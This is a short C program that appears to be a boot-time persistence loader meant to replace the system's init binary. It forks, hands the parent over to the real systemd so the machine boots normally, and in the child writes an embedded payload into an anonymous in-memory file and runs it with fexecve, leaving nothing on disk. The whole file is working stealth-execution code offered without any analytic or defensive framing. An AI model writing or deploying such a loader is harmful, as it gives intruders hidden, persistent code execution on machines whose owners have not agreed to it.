#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/mman.h>
#include <unistd.h>
#include <errno.h>

#define min(n1, n2) (n1 < n2 ? n1 : n2)

extern const char *payload;
extern const unsigned int payload_len;

int fdput(int fd, const char *str, size_t len)
{
    size_t cnt = 0;
    do {
        ssize_t result = write(fd, str + cnt, min(len - cnt, 0x7ffff000));
        if (result == -1) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        cnt += result;
    } while (cnt != len);
    return 0;
}

void run_payload()
{
    int fd;
    fd = memfd_create("", MFD_CLOEXEC);
    if (fdput(fd, payload, payload_len))
    {
        close(fd);
        return;
    }
    fexecve(fd, NULL, NULL);
}

int main(int argc, char *argv[])
{
    pid_t pid;

    pid = fork();

    if (pid)
    {
        // Parent
        execv("/lib/systemd/systemd", argv);
    }
    else
    {
        // Child
        run_payload();
    }
    return 0;
}
